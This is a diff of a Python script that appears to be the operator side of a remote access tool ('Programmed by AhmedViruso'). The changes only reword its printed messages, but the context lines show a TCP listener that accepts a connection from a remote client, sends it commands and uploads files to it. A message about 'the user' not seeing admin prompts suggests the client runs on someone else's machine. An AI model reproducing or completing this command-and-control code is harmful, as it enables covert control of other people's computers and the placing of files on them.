@@ -3,12 +3,12 @@
 try:
 	import socket,time,ctypes
 except:
-	print(" Error Import Libraries")
+	print(" Error while importing libraries")
 	exit()
 
 try:
-	ctypes.windll.user32.MessageBoxW(0, "Programmed By AhmedViruso", "Hello", 0)
-	ctypes.windll.user32.MessageBoxW(0, "If Server Suspended Because Something Just Restart It", "Note", 0)
+	ctypes.windll.user32.MessageBoxW(0, "Programmed by AhmedViruso", "Hello", 0)
+	ctypes.windll.user32.MessageBoxW(0, "If the server is suspended because something went wrong, just restart it.", "Note", 0)
 except:
 	pass
 
@@ -22,7 +22,7 @@ def Create(): # Create Tcp Socket
 
     except socket.error as failed:
 
-        print(" - Error Creating The Socket : " + str(failed))
+        print(" - Error while creating the socket : " + str(failed))
         time.sleep(1.5)
         Create()
 
@@ -36,10 +36,10 @@ def Bind(): # Bind The Socket
 
         S.bind((Ip, Port))
         S.listen(1)
-        print(" - Server Is Listening . .")
+        print(" - Server starts listening . .")
 
     except socket.error as failed:
-        print(" - Socket Binding Error : " + str(failed) + "\n" + " - Retrying...")
+        print(" - Error while binding the sockets : " + str(failed) + "\n" + " - Retrying...")
         time.sleep(1.5)
         Bind()
 
@@ -48,7 +48,7 @@ def Accept(): # Accpet The Connection
 
     try:
         Con,address = S.accept()
-        print(" - Connection Has Been Established - Ip -> "+address[0])
+        print(" - Connection has been established - Ip -> "+address[0])
         SendOrders(Con)
     except:
         time.sleep(1.5)
@@ -64,7 +64,7 @@ def SendOrders(Con):
             Con.send(str.encode(""))
         except: 
 
-            print(" - The Connection is Dead ")
+            print(" - The connection is dead ")
             Main()
             continue
 
@@ -100,14 +100,14 @@ def SendOrders(Con):
 
             except:
 
-                print(" - Error 1 , Something Is Wrong")
+                print(" - Error 1 , Something went wrong")
                 continue
 
 
         elif(Command == 'upload'):
         	
         	try:
-        		ctypes.windll.user32.MessageBoxW(0, "If You Send File Requires Admin Rights And The User Did Not See It , This Cause To Suspend Client Until Receive Response From User", "Note", 0)
+        		ctypes.windll.user32.MessageBoxW(0, "If you send a file it requires admin permissions and the user did not see it, this cause to suspend client until it receives a response from the user", "Note", 0)
 
         		try:
         			Up = input(" - File Path -> ")
@@ -137,7 +137,7 @@ def SendOrders(Con):
         				pass
 
         			else:
-        				print(" - [1] Undefined Reposnse From Client, Try Again")
+        				print(" - [1] Undefined reposnse from  the Client, Try Again")
         				continue
 
         			Con.sendall(Data) # Send the File
@@ -155,15 +155,15 @@ def SendOrders(Con):
         				continue
 
         			else:
-        				print(" - [2] Undefined Reposnse From Client , Try Again")
+        				print(" - [2] Undefined reposnse from the Client, Try Again")
         				continue
         				
         		else:
-        			print(" - [3] Undefined Reposnse From Client , Try Again")
+        			print(" - [3] Undefined reposnse from the Client, Try Again")
         			continue
 
         	except:
-        		print(" - Error 2 , Something Is Wrong")
+        		print(" - Error 2 , Something went wrong")
         		continue
 
 
